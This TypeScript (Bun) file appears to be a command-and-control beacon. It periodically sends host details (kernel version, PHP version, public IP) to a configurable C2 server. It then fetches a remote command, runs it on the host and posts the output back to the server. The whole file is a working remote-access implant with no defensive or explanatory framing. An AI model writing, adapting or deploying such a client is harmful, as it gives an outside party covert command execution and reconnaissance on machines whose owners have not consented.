import { argv, spawnSync, type SyncSubprocess } from "bun";
import os from "os";
import type { CommandPayloadDTO } from "./types";
import chalk from "chalk";

// Get command line arguments
const C2 = argv[2] || "http://localhost:7789";
const INTERVAL = +argv[3] || 5000;
const API_BASE_URL = `${C2}/api/tools/seoul`;

function getSystemInfo() {
  return {
    php: getPhpVersion(),
    os: getOsVersion(),
    ip: getIpAddress(),
  };
}

function getIpAddress() {
  try {
    return spawnSync(["curl", "icanhazip.com"]).stdout.toString().trim();
  } catch (err: unknown) {
    console.error(err);
    return "Unknown";
  }
}

function getOsVersion() {
  try {
    return spawnSync(["uname", "-a"]).stdout.toString();
  } catch (err: unknown) {
    console.error(err);
    return "Unknown";
  }
}

function getPhpVersion() {
  try {
    return spawnSync(["php", "-v"]).stdout.toString().split("\n")[0];
  } catch (err: unknown) {
    console.error(err);
    return "Unknown";
  }
}

async function postInfo() {
  try {
    const systemInfo = getSystemInfo();
    console.log('POSTing payload to C2:', systemInfo);
    await fetch(`${API_BASE_URL}/node-info`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(systemInfo),
    });
  } catch (err: unknown) {
    console.error(err);
  }
}

async function getAndRunRemoteCommand() {
  try {
    const response = await fetch(`${API_BASE_URL}/remote-command`);
    const payload = (await response.json()) as CommandPayloadDTO;
    const command = payload.command;

    // Run the command if it exists
    if (command) {
      const proc = runCommand(command)
      console.log(chalk.greenBright(proc.stdout ? proc.stdout.toString() : proc.stderr.toString()));
      console.log(chalk.yellowBright("ABOVE OUTPUT from command:", command));

      // Post the command output to C2
      await fetch(`${API_BASE_URL}/remote-command`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          commandRan: command,
          output: proc.stdout ? proc.stdout.toString() : proc.stderr.toString(),
          error: proc.stderr ? "True" : "False", // TODO: Figure out why this is returning true when output is returned
        }),
      });
    }
   } catch (err: unknown) {
    console.error(err);
  }
}

function runCommand(command: string): SyncSubprocess<"pipe", "pipe"> {
  const commandArr = command.split(" "); // TODO: Add handling for when commands come with strings that are seperated by spaces
  const process = spawnSync(commandArr); // Run the command

  return process
}
function runClient() {
  console.log("Pinging server @", API_BASE_URL);
  let pingCount = 0;
  setInterval(async () => {
    console.log(chalk.yellowBright(`Ping ${++pingCount}`));
    await postInfo();
    await getAndRunRemoteCommand();
  }, INTERVAL);
}


async function getSeoulServerIps() {
  const result = await fetch(API_BASE_URL); 
}

runClient();
